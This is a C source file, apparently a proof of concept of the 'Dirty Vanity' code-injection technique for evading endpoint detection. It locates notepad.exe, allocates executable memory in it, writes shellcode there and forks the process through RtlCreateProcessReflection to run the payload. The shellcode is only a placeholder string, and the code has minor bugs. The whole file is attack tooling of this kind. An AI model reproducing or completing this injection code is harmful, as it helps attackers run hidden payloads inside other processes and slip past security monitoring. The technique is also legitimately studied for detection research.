/*https://www.deepinstinct.com/blog/dirty-vanity-a-new-approach-to-code-injection-edr-bypass*/

#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>

//#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002

typedef struct MY_VM_COUNTERS {
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
} MYVM_COUNTERS, *PMYVM_COUNTERS;

typedef struct MY_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE ProcessId;
    HANDLE ParentProcessId;
    ULONG HandleCount;
    ULONG Reserved2[2];
    MYVM_COUNTERS VirtualMemoryCounters;
    SYSTEM_THREAD_INFORMATION Threads[1];  // Array of thread information
} MY_SYSTEM_PROCESS_INFORMATION, *MY_PSYSTEM_PROCESS_INFORMATION;

typedef struct _RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION {
    HANDLE ProcessHandle;   // Uchwyt do nowo utworzonego procesu "cienia"
    HANDLE ThreadHandle;    // Uchwyt do głównego wątku procesu
    CLIENT_ID ClientId;     // ID procesu i wątku nowego procesu
} RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION, *PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;

typedef NTSTATUS (NTAPI *pRtlCreateProcessReflection)(
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation);


int main(){

    unsigned char shellcode[] = {"require specific paylaod. check resource at at the top of the code"};
    SIZE_T shellcodesize = sizeof(shellcode);

    HANDLE snapshot = NULL; 
    HANDLE  hThread = NULL;
    HANDLE hProcess = NULL;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    LPVOID hRemote;
    PROCESSENTRY32W hEntry = {0};
    hEntry.dwSize = sizeof(PROCESSENTRY32W);
    THREADENTRY32 hTEntry; 
    hTEntry.dwSize = sizeof(THREADENTRY32);
    SIZE_T written = 0;


//creating an snapshot. https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if(snapshot == INVALID_HANDLE_VALUE){
        printf("[-] unable to create snapshot, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] creating snapshot\n");


//looking for process by its name
    if (Process32FirstW(snapshot, &hEntry)) {
            do{
            if (_wcsicmp(hEntry.szExeFile, L"notepad.exe") == 0) {
                break; // loop stops when process will be find 
            }
        }while (Process32NextW(snapshot, &hEntry)); 
    } else {
        wprintf(L"[-] unable to receive process list, error: [%d]\n", GetLastError());
        CloseHandle(snapshot);
    }


//opening target process
    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, TRUE, hEntry.th32ProcessID);
    if (hProcess == NULL){
        printf("[-] unable to open process, error: [%d]\n", GetLastError());
        CloseHandle(snapshot);
        return 1;
    }
    printf("[+] opening process: [%d]\n", hEntry.th32ProcessID);
    

//allocating memory
    hRemote = VirtualAllocEx(hProcess, NULL, shellcodesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (hRemote == NULL)
    {
        printf("[-] memory alocating failed, error: [%d]\n", GetLastError);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] alocating memory into: [%p]\n", hRemote);


//writing shellcode
    if (WriteProcessMemory(hProcess, hRemote, shellcode, sizeof(shellcode), &written) == 0)
    {
        printf("[-] writting shellcode failed, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] writting shellcode memory into: [%d]\n", written);


//creating fork and executing payload, calc.exe
    pRtlCreateProcessReflection RtlCreateProcessReflection = (pRtlCreateProcessReflection)GetProcAddress(hNtdll, "RtlCreateProcessReflection");
    PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };

    NTSTATUS ret = RtlCreateProcessReflection(hProcess, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, hRemote, NULL, NULL, &info);
    if(!NT_SUCCESS(ret)){
        printf("[-] unable to create reflecting process, status: [%x]", ret);
    }
    printf("[+] creating reflected process");

    CloseHandle(snapshot);
    CloseHandle(hProcess);
    return 0;
}
